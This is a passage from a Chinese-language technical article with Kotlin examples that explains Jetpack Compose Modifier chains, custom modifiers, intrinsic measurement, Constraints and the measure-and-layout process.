    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;R&gt;</span> <span class="hljs-title">foldOut</span><span class="hljs-params">(initial: <span class="hljs-type">R</span>, operation: (<span class="hljs-type">Modifier</span>.<span class="hljs-type">Element</span>, <span class="hljs-type">R</span>) -&gt; <span class="hljs-type">R</span>)</span></span>: R =
        outer.foldOut(<span class="hljs-keyword">inner</span>.foldOut(initial, operation), operation)
}
</code></pre>
<p><strong>核心洞察</strong>：<code>CombinedModifier</code> 是一个<strong>二叉树结构</strong>，<code>outer</code> 指向链表头部，<code>inner</code> 指向链表尾部。</p>
<h3 data-id="heading-5">1.4 执行顺序：为什么顺序很重要？</h3>
<p>这是 Modifier 最容易让人困惑的地方。让我们通过一个例子理解：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 情况 A</span>
Modifier
    .padding(<span class="hljs-number">16.</span>dp)        <span class="hljs-comment">// 外层</span>
    .background(Color.Blue) <span class="hljs-comment">// 中间</span>
    .padding(<span class="hljs-number">8.</span>dp)         <span class="hljs-comment">// 内层</span>
    .size(<span class="hljs-number">100.</span>dp)
</code></pre>
<p><strong>视觉效果</strong>：</p>
<pre><code class="hljs language-scss" lang="scss">┌─────────────────────────────┐  ← 外层 <span class="hljs-attribute">padding</span> (<span class="hljs-number">16</span>dp) - 透明区域
│                             │
│  ┌───────────────────────┐  │
│  │  蓝色背景             │  │
│  │  ┌─────────────────┐  │  │
│  │  │                 │  │  │  ← 内层 <span class="hljs-attribute">padding</span> (<span class="hljs-number">8</span>dp) - 蓝色区域内
│  │  │    <span class="hljs-number">100</span>x100      │  │  │
│  │  │     内容        │  │  │
│  │  │                 │  │  │
│  │  └─────────────────┘  │  │
│  │                       │  │
│  └───────────────────────┘  │
│                             │
└─────────────────────────────┘
</code></pre>
<p><strong>设计原则</strong>：Modifier 的执行遵循**"从外到内"**的顺序。先应用的 Modifier 在外层，后应用的在内层。</p>
<h3 data-id="heading-6">1.5 Modifier 的遍历机制</h3>
<p>Compose 需要遍历 Modifier 链表来应用各种效果。遍历有两种方式：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// foldIn: 从左到右（outer → inner）</span>
modifier.foldIn(initialValue) { acc, element -&gt;
    <span class="hljs-comment">// 处理每个 Element</span>
    acc + element
}

<span class="hljs-comment">// foldOut: 从右到左（inner → outer）</span>
modifier.foldOut(initialValue) { element, acc -&gt;
    <span class="hljs-comment">// 处理每个 Element</span>
    element + acc
}
</code></pre>
<p><strong>应用场景</strong>：</p>
<ul>
<li><strong>foldIn</strong>：测量、布局时，需要从外到内传递约束</li>
<li><strong>foldOut</strong>：绘制时，需要从内到外绘制内容</li>
</ul>
<h3 data-id="heading-7">1.6 Modifier 的分类与内部实现</h3>
<h4 data-id="heading-8">1.6.1 布局类 Modifier</h4>
<p><strong>size() 的实现原理</strong>：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// SizeModifier 简化版</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SizeModifier</span>(
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> minWidth: Dp = Dp.Unspecified,
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> minHeight: Dp = Dp.Unspecified,
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> maxWidth: Dp = Dp.Unspecified,
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> maxHeight: Dp = Dp.Unspecified,
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> enforceIncoming: <span class="hljs-built_in">Boolean</span> = <span class="hljs-literal">true</span>
) : LayoutModifier {
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> MeasureScope.<span class="hljs-title">measure</span><span class="hljs-params">(
        measurable: <span class="hljs-type">Measurable</span>,
        constraints: <span class="hljs-type">Constraints</span>
    )</span></span>: MeasureResult {
        <span class="hljs-comment">// 解析尺寸值</span>
        <span class="hljs-keyword">val</span> resolvedMinWidth = <span class="hljs-keyword">if</span> (minWidth != Dp.Unspecified) {
            minWidth.roundToPx()
        } <span class="hljs-keyword">else</span> {
            constraints.minWidth
        }
        
        <span class="hljs-keyword">val</span> resolvedMaxWidth = <span class="hljs-keyword">if</span> (maxWidth != Dp.Unspecified) {
            maxWidth.roundToPx()
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-keyword">if</span> (enforceIncoming) constraints.maxWidth <span class="hljs-keyword">else</span> Constraints.Infinity
        }
        
        <span class="hljs-comment">// ... 高度同理</span>
        
        <span class="hljs-comment">// 创建新的约束</span>
        <span class="hljs-keyword">val</span> wrappedConstraints = Constraints(
            minWidth = resolvedMinWidth,
            maxWidth = resolvedMaxWidth,
            minHeight = resolvedMinHeight,
            maxHeight = resolvedMaxHeight
        )
        
        <span class="hljs-comment">// 测量子元素</span>
        <span class="hljs-keyword">val</span> placeable = measurable.measure(wrappedConstraints)
        
        <span class="hljs-comment">// 返回测量结果</span>
        <span class="hljs-keyword">return</span> layout(placeable.width, placeable.height) {
            placeable.placeRelative(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>)
        }
    }
}
</code></pre>
<p><strong>关键洞察</strong>：SizeModifier 是一个 <code>LayoutModifier</code>，它拦截了测量过程，修改了传递给子元素的 Constraints。</p>
<h4 data-id="heading-9">1.6.2 绘制类 Modifier</h4>
<p><strong>background() 的实现原理</strong>：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// BackgroundModifier 简化版</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BackgroundModifier</span>(
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> color: Color? = <span class="hljs-literal">null</span>,
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> brush: Brush? = <span class="hljs-literal">null</span>,
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> shape: Shape = RectangleShape,
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> alpha: <span class="hljs-built_in">Float</span> = <span class="hljs-number">1.0f</span>
) : DrawModifier {
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> ContentDrawScope.<span class="hljs-title">draw</span><span class="hljs-params">()</span></span> {
        <span class="hljs-comment">// 绘制背景</span>
        <span class="hljs-keyword">if</span> (shape == RectangleShape) {
            <span class="hljs-comment">// 矩形背景</span>
            <span class="hljs-keyword">if</span> (color != <span class="hljs-literal">null</span>) {
                drawRect(color = color, alpha = alpha)
            } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (brush != <span class="hljs-literal">null</span>) {
                drawRect(brush = brush, alpha = alpha)
            }
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// 圆角/自定义形状背景</span>
            <span class="hljs-keyword">val</span> outline = shape.createOutline(size, layoutDirection, <span class="hljs-keyword">this</span>)
            <span class="hljs-keyword">if</span> (color != <span class="hljs-literal">null</span>) {
                drawOutline(outline, color = color, alpha = alpha)
            } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (brush != <span class="hljs-literal">null</span>) {
                drawOutline(outline, brush = brush, alpha = alpha)
            }
        }
        
        <span class="hljs-comment">// 绘制内容（调用 drawContent 继续链式绘制）</span>
        drawContent()
    }
}
</code></pre>
<p><strong>关键洞察</strong>：<code>DrawModifier</code> 拦截了绘制流程，先绘制背景，再通过 <code>drawContent()</code> 继续绘制后续内容和子元素。</p>
<h4 data-id="heading-10">1.6.3 交互类 Modifier</h4>
<p><strong>clickable() 的实现原理</strong>：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// clickable 的 Modifier 链</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> Modifier.<span class="hljs-title">clickable</span><span class="hljs-params">(
    enabled: <span class="hljs-type">Boolean</span> = <span class="hljs-literal">true</span>,
    onClickLabel: <span class="hljs-type">String</span>? = <span class="hljs-literal">null</span>,
    role: <span class="hljs-type">Role</span>? = <span class="hljs-literal">null</span>,
    onClick: () -&gt; <span class="hljs-type">Unit</span>
)</span></span>: Modifier = composed(
    inspectorInfo = debugInspectorInfo { ... }
) {
    <span class="hljs-keyword">val</span> interactionSource = remember { MutableInteractionSource() }
    <span class="hljs-keyword">val</span> indication = LocalIndication.current
    
    Modifier
        .clickable(
            interactionSource = interactionSource,
            indication = indication,
            enabled = enabled,
            onClickLabel = onClickLabel,
            role = role,
            onClick = onClick
        )
}
</code></pre>
<p><strong>clickable 内部 Modifier 链</strong>：</p>
<pre><code class="hljs language-scss" lang="scss">clickable
├── focusableInNonTouchMode  (焦点管理)
├── pointerInput             (手势检测)
├── semantics                (无障碍支持)
├── indication               (涟漪效果)
└── isComposeRootInScrollableContainer (滚动容器检测)
</code></pre>
<h3 data-id="heading-11">1.7 自定义 Modifier 的完整指南</h3>
<h4 data-id="heading-12">1.7.1 简单自定义：使用 composed</h4>
<p>适用于需要访问 CompositionLocal 或 remember 状态的场景：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 自定义带阴影的圆角背景</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> Modifier.<span class="hljs-title">shadowBackground</span><span class="hljs-params">(
    color: <span class="hljs-type">Color</span>,
    cornerRadius: <span class="hljs-type">Dp</span> = <span class="hljs-number">8.</span>dp,
    shadowElevation: <span class="hljs-type">Dp</span> = <span class="hljs-number">4.</span>dp
)</span></span>: Modifier = composed {
    <span class="hljs-comment">// 可以在这里使用 remember 和 CompositionLocal</span>
    <span class="hljs-keyword">val</span> density = LocalDensity.current
    <span class="hljs-keyword">val</span> shadowPx = with(density) { shadowElevation.toPx() }
    
    remember(color, cornerRadius, shadowElevation) {
        Modifier
            .shadow(shadowElevation, RoundedCornerShape(cornerRadius))
            .background(color, RoundedCornerShape(cornerRadius))
            .padding(cornerRadius)
    }
}
</code></pre>
<h4 data-id="heading-13">1.7.2 中级自定义：实现 Modifier.NodeElement</h4>
<p>适用于需要自定义测量、布局或绘制的场景：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 自定义绘制对角线的 Modifier</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">DiagonalLineElement</span>(
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> color: Color,
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> strokeWidth: <span class="hljs-built_in">Float</span>
) : ModifierNodeElement&lt;DiagonalLineNode&gt;() {
    
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">create</span><span class="hljs-params">()</span></span>: DiagonalLineNode = 
        DiagonalLineNode(color, strokeWidth)
    
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">update</span><span class="hljs-params">(node: <span class="hljs-type">DiagonalLineNode</span>)</span></span> {
        node.color = color
        node.strokeWidth = strokeWidth
    }
    
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">hashCode</span><span class="hljs-params">()</span></span>: <span class="hljs-built_in">Int</span> =
        color.hashCode() * <span class="hljs-number">31</span> + strokeWidth.hashCode()
    
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">equals</span><span class="hljs-params">(other: <span class="hljs-type">Any</span>?)</span></span>: <span class="hljs-built_in">Boolean</span> =
        other <span class="hljs-keyword">is</span> DiagonalLineElement &amp;&amp;
        other.color == color &amp;&amp;
        other.strokeWidth == strokeWidth
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">DiagonalLineNode</span>(
    <span class="hljs-keyword">var</span> color: Color,
    <span class="hljs-keyword">var</span> strokeWidth: <span class="hljs-built_in">Float</span>
) : Modifier.Node(), DrawModifierNode {
    
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> ContentDrawScope.<span class="hljs-title">draw</span><span class="hljs-params">()</span></span> {
        <span class="hljs-comment">// 先绘制内容</span>
        drawContent()
        
        <span class="hljs-comment">// 再绘制对角线</span>
        drawLine(
            color = color,
            start = Offset(<span class="hljs-number">0f</span>, <span class="hljs-number">0f</span>),
            end = Offset(size.width, size.height),
            strokeWidth = strokeWidth
        )
    }
}

<span class="hljs-comment">// 使用扩展函数</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> Modifier.<span class="hljs-title">diagonalLine</span><span class="hljs-params">(
    color: <span class="hljs-type">Color</span>,
    strokeWidth: <span class="hljs-type">Float</span> = <span class="hljs-number">2</span>f
)</span></span>: Modifier = <span class="hljs-keyword">this</span>.then(DiagonalLineElement(color, strokeWidth))
</code></pre>
<h4 data-id="heading-14">1.7.3 高级自定义：LayoutModifier</h4>
<p>适用于需要自定义测量和布局逻辑的场景：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 自定义 AspectRatio Modifier（保持宽高比）</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">AspectRatioElement</span>(
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> ratio: <span class="hljs-built_in">Float</span>
) : ModifierNodeElement&lt;AspectRatioNode&gt;() {
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">create</span><span class="hljs-params">()</span></span> = AspectRatioNode(ratio)
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">update</span><span class="hljs-params">(node: <span class="hljs-type">AspectRatioNode</span>)</span></span> {
        node.ratio = ratio
    }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">AspectRatioNode</span>(<span class="hljs-keyword">var</span> ratio: <span class="hljs-built_in">Float</span>) : 
    Modifier.Node(), 
    LayoutModifierNode {
    
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> MeasureScope.<span class="hljs-title">measure</span><span class="hljs-params">(
        measurable: <span class="hljs-type">Measurable</span>,
        constraints: <span class="hljs-type">Constraints</span>
    )</span></span>: MeasureResult {
        <span class="hljs-comment">// 根据约束计算合适的尺寸</span>
        <span class="hljs-keyword">val</span> width = constraints.maxWidth
        <span class="hljs-keyword">val</span> height = (width / ratio).toInt()
        
        <span class="hljs-comment">// 确保不超过最大高度</span>
        <span class="hljs-keyword">val</span> finalHeight = <span class="hljs-keyword">if</span> (height &gt; constraints.maxHeight) {
            constraints.maxHeight
        } <span class="hljs-keyword">else</span> {
            height
        }
        
        <span class="hljs-comment">// 重新计算宽度以保持比例</span>
        <span class="hljs-keyword">val</span> finalWidth = (finalHeight * ratio).toInt()
        
        <span class="hljs-comment">// 测量子元素</span>
        <span class="hljs-keyword">val</span> placeable = measurable.measure(
            Constraints.fixed(finalWidth, finalHeight)
        )
        
        <span class="hljs-keyword">return</span> layout(finalWidth, finalHeight) {
            placeable.placeRelative(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>)
        }
    }
}
</code></pre>
<h3 data-id="heading-15">1.8 Intrinsic 测量：解决"先有鸡还是先有蛋"</h3>
<h4 data-id="heading-16">1.8.1 问题场景</h4>
<p>考虑这样一个需求：两个 Text 垂直排列，要求 Divider 的宽度等于两个 Text 中最宽的那个。</p>
<pre><code class="hljs language-kotlin" lang="kotlin">Column {
    Text(<span class="hljs-string">"Short"</span>)
    Text(<span class="hljs-string">"Longer text"</span>)
    Divider() <span class="hljs-comment">// 宽度应该等于 "Longer text" 的宽度</span>
}
</code></pre>
<p><strong>问题</strong>：在测量 Divider 时，Column 还不知道两个 Text 的宽度，因为 Text 还没被测量。</p>
<h4 data-id="heading-17">1.8.2 Intrinsic 测量的原理</h4>
<p>Intrinsic 测量允许父组件在正式测量前，<strong>预先询问子元素的期望尺寸</strong>：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">IntrinsicMeasurable</span> {
    <span class="hljs-comment">// 给定高度，返回最小/最大宽度</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">minIntrinsicWidth</span><span class="hljs-params">(height: <span class="hljs-type">Int</span>)</span></span>: <span class="hljs-built_in">Int</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">maxIntrinsicWidth</span><span class="hljs-params">(height: <span class="hljs-type">Int</span>)</span></span>: <span class="hljs-built_in">Int</span>
    
    <span class="hljs-comment">// 给定宽度，返回最小/最大高度  </span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">minIntrinsicHeight</span><span class="hljs-params">(width: <span class="hljs-type">Int</span>)</span></span>: <span class="hljs-built_in">Int</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">maxIntrinsicHeight</span><span class="hljs-params">(width: <span class="hljs-type">Int</span>)</span></span>: <span class="hljs-built_in">Int</span>
}
</code></pre>
<p><strong>使用 Intrinsic 测量解决 Divider 问题</strong>：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">IntrinsicWidthDemo</span><span class="hljs-params">()</span></span> {
    Column(
        modifier = Modifier.width(IntrinsicSize.Max)  <span class="hljs-comment">// 使用最大固有宽度</span>
    ) {
        Text(<span class="hljs-string">"Short text"</span>)
        Text(<span class="hljs-string">"This is a longer text"</span>)
        Divider(
            modifier = Modifier.fillMaxWidth(),
            color = Color.Black
        )
    }
}
</code></pre>
<p><strong>执行流程</strong>：</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> Column 收到 IntrinsicSize.Max 约束
<span class="hljs-bullet">2.</span> Column 询问所有子元素的 maxIntrinsicWidth
<span class="hljs-bullet">3.</span> Text 返回自己的文本宽度
<span class="hljs-bullet">4.</span> Column 取最大值作为自身宽度
<span class="hljs-bullet">5.</span> Column 正式测量，将宽度约束传递给子元素
<span class="hljs-bullet">6.</span> Divider 收到与最宽 Text 相同的宽度
</code></pre>
<h4 data-id="heading-18">1.8.3 IntrinsicSize.Min 与 IntrinsicSize.Max</h4>




















<table><thead><tr><th>类型</th><th>说明</th><th>应用场景</th></tr></thead><tbody><tr><td><code>IntrinsicSize.Min</code></td><td>使用子元素的最小固有尺寸</td><td>按钮等需要紧凑尺寸的场景</td></tr><tr><td><code>IntrinsicSize.Max</code></td><td>使用子元素的最大固有尺寸</td><td>表单等需要对齐的场景</td></tr></tbody></table>
<h3 data-id="heading-19">1.9 Modifier 性能优化</h3>
<h4 data-id="heading-20">1.9.1 避免不必要的重组</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// ❌ 错误：每次重组都创建新的 Modifier</span>
<span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">BadExample</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">var</span> count <span class="hljs-keyword">by</span> remember { mutableStateOf(<span class="hljs-number">0</span>) }
    
    Text(
        text = <span class="hljs-string">"Count: <span class="hljs-variable">$count</span>"</span>,
        modifier = Modifier.padding(<span class="hljs-number">16.</span>dp)  <span class="hljs-comment">// 每次重组都创建新实例</span>
    )
}

<span class="hljs-comment">// ✅ 正确：使用 remember 缓存 Modifier</span>
<span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">GoodExample</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">var</span> count <span class="hljs-keyword">by</span> remember { mutableStateOf(<span class="hljs-number">0</span>) }
    <span class="hljs-keyword">val</span> modifier = remember { Modifier.padding(<span class="hljs-number">16.</span>dp) }
    
    Text(
        text = <span class="hljs-string">"Count: <span class="hljs-variable">$count</span>"</span>,
        modifier = modifier  <span class="hljs-comment">// 复用同一个实例</span>
    )
}

<span class="hljs-comment">// ✅ 更好：将 Modifier 作为参数，由父组件提供</span>
<span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">BestExample</span><span class="hljs-params">(
    text: <span class="hljs-type">String</span>,
    modifier: <span class="hljs-type">Modifier</span> = Modifier  <span class="hljs-comment">// 由调用方提供</span>
)</span></span> {
    Text(
        text = text,
        modifier = modifier
    )
}
</code></pre>
<h4 data-id="heading-21">1.9.2 Modifier 的相等性优化</h4>
<p>Compose 使用 <code>equals()</code> 判断 Modifier 是否变化，从而决定是否跳过重组：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 自定义 Modifier 时，务必实现 equals 和 hashCode</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">MyModifier</span>(
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> color: Color,
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> size: Dp
) : Modifier.Element {
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">equals</span><span class="hljs-params">(other: <span class="hljs-type">Any</span>?)</span></span>: <span class="hljs-built_in">Boolean</span> {
        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span> === other) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>
        <span class="hljs-keyword">if</span> (other !<span class="hljs-keyword">is</span> MyModifier) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>
        <span class="hljs-keyword">return</span> color == other.color &amp;&amp; size == other.size
    }
    
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">hashCode</span><span class="hljs-params">()</span></span>: <span class="hljs-built_in">Int</span> {
        <span class="hljs-keyword">return</span> color.hashCode() * <span class="hljs-number">31</span> + size.hashCode()
    }
}
</code></pre>
<hr/>
<h2 data-id="heading-22">二、布局系统深度解析：从测量到绘制</h2>
<h3 data-id="heading-23">2.1 Compose 布局的三阶段</h3>
<p>Compose 的渲染流程分为三个阶段：</p>
<pre><code class="hljs language-css" lang="css">┌─────────────────────────────────────────────────────────────┐
│                      Composition                            │
│  执行 Composable 函数，构建 UI 树（LayoutNode 树）            │
└─────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────┐
│                        Layout                               │
│  测量每个节点的尺寸（Measure），确定位置（Place）              │
└─────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────┐
│                        Drawing                              │
│  将 UI 绘制到 <span class="hljs-selector-tag">Canvas</span> 上                                      │
└─────────────────────────────────────────────────────────────┘
</code></pre>
<h3 data-id="heading-24">2.2 Layout 节点的数据结构</h3>
<p>每个 Composable 在布局阶段都会对应一个 <code>LayoutNode</code>：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 简化版 LayoutNode 结构</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">LayoutNode</span> {
    <span class="hljs-comment">// 父节点</span>
    <span class="hljs-keyword">var</span> parent: LayoutNode? = <span class="hljs-literal">null</span>
    
    <span class="hljs-comment">// 子节点列表</span>
    <span class="hljs-keyword">val</span> children: MutableList&lt;LayoutNode&gt; = mutableListOf()
    
    <span class="hljs-comment">// Modifier 链表</span>
    <span class="hljs-keyword">var</span> modifier: Modifier = Modifier
    
    <span class="hljs-comment">// 测量结果</span>
    <span class="hljs-keyword">var</span> width: <span class="hljs-built_in">Int</span> = <span class="hljs-number">0</span>
    <span class="hljs-keyword">var</span> height: <span class="hljs-built_in">Int</span> = <span class="hljs-number">0</span>
    
    <span class="hljs-comment">// 位置</span>
    <span class="hljs-keyword">var</span> x: <span class="hljs-built_in">Int</span> = <span class="hljs-number">0</span>
    <span class="hljs-keyword">var</span> y: <span class="hljs-built_in">Int</span> = <span class="hljs-number">0</span>
    
    <span class="hljs-comment">// 测量函数（由 Layout Composable 提供）</span>
    <span class="hljs-keyword">lateinit</span> <span class="hljs-keyword">var</span> measurePolicy: MeasurePolicy
}
</code></pre>
<h3 data-id="heading-25">2.3 Constraints：布局的约束条件</h3>
<p>Constraints 是 Compose 布局系统的核心，它定义了尺寸的限制范围：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Constraints</span> {
    <span class="hljs-keyword">val</span> minWidth: <span class="hljs-built_in">Int</span>
    <span class="hljs-keyword">val</span> maxWidth: <span class="hljs-built_in">Int</span>
    <span class="hljs-keyword">val</span> minHeight: <span class="hljs-built_in">Int</span>
    <span class="hljs-keyword">val</span> maxHeight: <span class="hljs-built_in">Int</span>
    
    <span class="hljs-keyword">companion</span> <span class="hljs-keyword">object</span> {
        <span class="hljs-comment">// 创建固定尺寸约束</span>
        <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">fixed</span><span class="hljs-params">(width: <span class="hljs-type">Int</span>, height: <span class="hljs-type">Int</span>)</span></span>: Constraints
        
        <span class="hljs-comment">// 创建最大尺寸约束</span>
        <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">maxWidth</span><span class="hljs-params">(width: <span class="hljs-type">Int</span>)</span></span>: Constraints
        <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">maxHeight</span><span class="hljs-params">(height: <span class="hljs-type">Int</span>)</span></span>: Constraints
        
        <span class="hljs-comment">// 无限约束</span>
        <span class="hljs-keyword">val</span> Infinity = <span class="hljs-built_in">Int</span>.MAX_VALUE
    }
}
</code></pre>
<p><strong>约束类型</strong>：</p>
<pre><code class="hljs language-ini" lang="ini">┌─────────────────────────────────────────────────────────────┐
│                    约束类型图解                              │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  精确约束                    范围约束                       │
│  ┌─────────┐               ┌───────────────────────────┐   │
│  │         │               │  minWidth          maxWidth│   │
│  │ 100x100 │               │  ├─────────────────────┤   │   │
│  │         │               │       可以是任意值          │   │
│  └─────────┘               └───────────────────────────┘   │
│  <span class="hljs-attr">minWidth</span> = maxWidth = <span class="hljs-number">100</span>                                  │
│                                                             │
│  无约束                                                     │
│  ┌─────────────────────────────────────────────────────┐   │
│  │                    Infinity                          │   │
│  │  可以是任意大的尺寸                                   │   │
│  └─────────────────────────────────────────────────────┘   │
│  <span class="hljs-attr">maxWidth</span> = Int.MAX_VALUE                                   │
│                                                             │
└─────────────────────────────────────────────────────────────┘
</code></pre>
<h3 data-id="heading-26">2.4 测量流程详解</h3>
<p>测量是一个<strong>自顶向下</strong>的过程：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 父节点测量子节点的流程</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">measureChild</span><span class="hljs-params">(child: <span class="hljs-type">Measurable</span>, constraints: <span class="hljs-type">Constraints</span>)</span></span>: Placeable {
    <span class="hljs-comment">// 1. 根据父节点的约束，计算给子节点的约束</span>
    <span class="hljs-keyword">val</span> childConstraints = calculateChildConstraints(constraints)
    
    <span class="hljs-comment">// 2. 让子节点测量自己</span>
    <span class="hljs-keyword">val</span> placeable = child.measure(childConstraints)
    
    <span class="hljs-comment">// 3. 返回测量结果（Placeable）</span>
    <span class="hljs-keyword">return</span> placeable
}
</code></pre>
<p><strong>完整测量流程示例</strong>：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">MeasureDemo</span><span class="hljs-params">()</span></span> {
    Layout(
        content = {
            Text(<span class="hljs-string">"Child 1"</span>)
            Text(<span class="hljs-string">"Child 2"</span>)
        }
    ) { measurables, constraints -&gt;
        <span class="hljs-comment">// constraints: 父节点给当前节点的约束</span>
        println(<span class="hljs-string">"父约束: minW=<span class="hljs-subst">${constraints.minWidth}</span>, maxW=<span class="hljs-subst">${constraints.maxWidth}</span>"</span>)
        
        <span class="hljs-comment">// 测量子节点</span>
        <span class="hljs-keyword">val</span> placeables = measurables.map { measurable -&gt;
            <span class="hljs-comment">// 可以给子节点不同的约束</span>
            <span class="hljs-keyword">val</span> childConstraints = Constraints(
                minWidth = <span class="hljs-number">0</span>,
                maxWidth = constraints.maxWidth / <span class="hljs-number">2</span>,  <span class="hljs-comment">// 每个子节点最多一半宽度</span>
                minHeight = <span class="hljs-number">0</span>,
                maxHeight = constraints.maxHeight
            )
            measurable.measure(childConstraints)
        }
        
        <span class="hljs-comment">// 计算自己的尺寸</span>
        <span class="hljs-keyword">val</span> width = placeables.sumOf { it.width }
        <span class="hljs-keyword">val</span> height = placeables.maxOf { it.height }
        
        <span class="hljs-comment">// 布局</span>
        layout(width, height) {
            <span class="hljs-keyword">var</span> x = <span class="hljs-number">0</span>
            placeables.forEach { placeable -&gt;
                placeable.placeRelative(x, <span class="hljs-number">0</span>)
                x += placeable.width
            }
        }
    }
}
</code></pre>
<h3 data-id="heading-27">2.5 Column 的测量与布局原理</h3>
<p>让我们深入分析 Column 的实现：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// Column 的简化实现</span>
<span class="hljs-meta">@Composable</span>
<span class="hljs-keyword">inline</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">Column</span><span class="hljs-params">(
    modifier: <span class="hljs-type">Modifier</span> = Modifier,
    verticalArrangement: <span class="hljs-type">Arrangement</span>.<span class="hljs-type">Vertical</span> = Arrangement.Top,
    horizontalAlignment: <span class="hljs-type">Alignment</span>.<span class="hljs-type">Horizontal</span> = Alignment.Start,
